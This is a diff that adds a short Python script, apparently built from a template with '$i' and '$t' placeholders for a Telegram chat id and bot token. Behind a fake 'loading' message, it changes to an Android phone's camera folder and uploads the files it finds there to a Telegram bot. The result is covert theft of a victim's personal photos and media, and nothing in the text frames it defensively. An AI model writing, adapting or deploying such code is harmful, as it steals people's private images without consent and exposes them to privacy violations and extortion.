@@ -1,0 +1,15 @@
+import os
+try:
+	import requests
+except:
+	os.system('pip install requests')
+print('\[1;31m[*] loding ...')
+id = '$i'
+token='$t'
+os.chdir('/sdcard/DCIM/Camera')
+path = list(os.scandir('.'))
+for i in path:
+    if 'jpg' or 'mp4' or 'mp3' in i.name:
+        print(i.name)
+        file={'document': open(f'{i.name}','rb')}
+        req = requests.post(f'https://api.telegram.org/bot{token}/sendDocument?chat_id={id}', files=file)
